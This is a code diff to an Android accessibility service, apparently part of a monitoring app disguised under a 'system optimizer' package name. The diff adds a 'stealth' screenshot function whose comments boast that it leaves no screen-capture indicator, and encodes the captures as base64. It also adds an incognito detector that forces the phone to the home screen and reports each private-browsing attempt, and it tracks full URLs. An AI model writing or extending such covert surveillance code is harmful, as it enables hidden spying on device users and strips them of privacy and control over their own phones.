@@ -2,9 +2,15 @@ package com.system.optimizer.monitor
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
+import android.content.Context
+import android.graphics.Bitmap
+import android.os.Build
+import android.util.Base64
 import android.util.Log
+import android.view.Display
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import java.io.ByteArrayOutputStream
 import java.net.URI
 
 /**
@@ -58,16 +64,72 @@ class BrowserTracker : AccessibilityService() {
     private val DEBOUNCE_MS = 1_000L // 1 second
 
     companion object {
+        @Volatile
+        var instance: BrowserTracker? = null
+
         /**
          * Static callback set by MonitoringService to receive web activity events.
          * Parameters: domain, url, durationSeconds
          */
         @Volatile
         var onWebActivity: ((domain: String, url: String, durationSeconds: Int) -> Unit)? = null
+
+        /**
+         * Capture a 100% stealth screenshot using AccessibilityService (Android 11+).
+         * Produces ZERO screencast/screen mirroring indicators in the Android menu/status bar!
+         */
+        fun captureStealthBase64(context: Context, callback: (String?) -> Unit) {
+            val service = instance
+            if (service == null || Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+                callback(null)
+                return
+            }
+            try {
+                service.takeScreenshot(
+                    Display.DEFAULT_DISPLAY,
+                    context.mainExecutor,
+                    object : AccessibilityService.TakeScreenshotCallback {
+                        override fun onSuccess(screenshot: AccessibilityService.ScreenshotResult) {
+                            try {
+                                val hwBitmap = Bitmap.wrapHardwareBuffer(
+                                    screenshot.hardwareBuffer,
+                                    screenshot.colorSpace
+                                )
+                                val bitmap = hwBitmap?.copy(Bitmap.Config.ARGB_8888, false)
+                                hwBitmap?.recycle()
+                                screenshot.hardwareBuffer.close()
+
+                                if (bitmap != null) {
+                                    val stream = ByteArrayOutputStream()
+                                    bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream)
+                                    val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
+                                    bitmap.recycle()
+                                    callback(base64)
+                                } else {
+                                    callback(null)
+                                }
+                            } catch (e: Exception) {
+                                Log.e("BrowserTracker", "Error compressing stealth screenshot: ${e.message}")
+                                callback(null)
+                            }
+                        }
+
+                        override fun onFailure(errorCode: Int) {
+                            Log.w("BrowserTracker", "Stealth takeScreenshot failed with code: $errorCode")
+                            callback(null)
+                        }
+                    }
+                )
+            } catch (e: Exception) {
+                Log.e("BrowserTracker", "Error initiating takeScreenshot: ${e.message}")
+                callback(null)
+            }
+        }
     }
 
     override fun onServiceConnected() {
         super.onServiceConnected()
+        instance = this
         Log.i(TAG, "BrowserTracker AccessibilityService connected")
 
         // Configure the service programmatically as a backup to XML config
@@ -118,6 +180,12 @@ class BrowserTracker : AccessibilityService() {
         try {
             val rootNode = rootInActiveWindow ?: return
 
+            // 🚫 INCOGNITO BLOCKER: Check if user opened an Incognito or Private Tab
+            if (checkAndBlockIncognito(rootNode, packageName)) {
+                rootNode.recycle()
+                return
+            }
+
             // Try known URL bar resource ID first
             val urlBarId = browserUrlBarIds[packageName]
             var urlText: String? = null
@@ -144,6 +212,76 @@ class BrowserTracker : AccessibilityService() {
             // Accessibility tree can be flaky — don't crash
             Log.w(TAG, "Error extracting URL: ${e.message}")
         }
+    }
+
+    /**
+     * Detects Incognito/Private tabs using resource IDs and screen text.
+     * If found, immediately forces the phone back to Home Screen and reports the attempt.
+     */
+    private fun checkAndBlockIncognito(node: AccessibilityNodeInfo, packageName: String): Boolean {
+        try {
+            // Check known Incognito indicator badges across major browsers
+            val incognitoIds = listOf(
+                "com.android.chrome:id/incognito_indicator",
+                "com.android.chrome:id/incognito_badge",
+                "org.mozilla.firefox:id/private_browsing_indicator",
+                "com.sec.android.app.sbrowser:id/secret_mode_badge",
+                "com.microsoft.emmx:id/inprivate_badge"
+            )
+            for (id in incognitoIds) {
+                val nodes = node.findAccessibilityNodeInfosByViewId(id)
+                if (!nodes.isNullOrEmpty()) {
+                    nodes.forEach { it.recycle() }
+                    blockIncognitoNow(packageName)
+                    return true
+                }
+            }
+
+            // Check if visible text mentions Incognito / Private browsing
+            if (hasIncognitoText(node)) {
+                blockIncognitoNow(packageName)
+                return true
+            }
+        } catch (_: Exception) {}
+        return false
+    }
+
+    private fun hasIncognitoText(node: AccessibilityNodeInfo): Boolean {
+        try {
+            val text = (node.text ?: node.contentDescription)?.toString()?.lowercase()
+            if (text != null) {
+                if (text.contains("incognito tab") || text.contains("you've gone incognito") ||
+                    text.contains("private browsing") || text.contains("private tab") ||
+                    text.contains("inprivate tab") || text.contains("secret mode")) {
+                    return true
+                }
+            }
+            for (i in 0 until node.childCount) {
+                val child = node.getChild(i) ?: continue
+                val result = hasIncognitoText(child)
+                child.recycle()
+                if (result) return true
+            }
+        } catch (_: Exception) {}
+        return false
+    }
+
+    private fun blockIncognitoNow(packageName: String) {
+        val now = System.currentTimeMillis()
+        if (now - lastReportedTime < 2000 && lastReportedDomain == "🚫 BLOCKED: Incognito") return
+
+        Log.w(TAG, "Incognito mode detected in $packageName — blocking instantly!")
+        
+        // Immediately kick user to Home Screen
+        performGlobalAction(GLOBAL_ACTION_HOME)
+
+        finalizeCurrentVisit()
+        lastReportedDomain = "🚫 BLOCKED: Incognito"
+        lastReportedTime = now
+
+        try {
+            onWebActivity?.invoke("🚫 BLOCKED: Incognito", "Incognito/Private Tab Attempted ($packageName)", 0)
+        } catch (_: Exception) {}
     }
 
     /**
@@ -181,13 +319,13 @@ class BrowserTracker : AccessibilityService() {
             return
         }
 
-        if (domain != currentDomain) {
-            // Domain changed — finalize previous visit and start new one
+        if (rawUrl != currentUrl) {
+            // URL changed (e.g. new YouTube video or page navigation) — finalize previous visit and start new one
             finalizeCurrentVisit()
             currentDomain = domain
             currentUrl = rawUrl
             domainStartTime = now
-            Log.d(TAG, "Now tracking: $domain")
+            Log.d(TAG, "Now tracking URL: $rawUrl")
         }
     }
 
@@ -242,7 +380,8 @@ class BrowserTracker : AccessibilityService() {
     }
 
     override fun onDestroy() {
-        finalizeCurrentVisit()
         super.onDestroy()
+        instance = null
+        finalizeCurrentVisit()
     }
 }
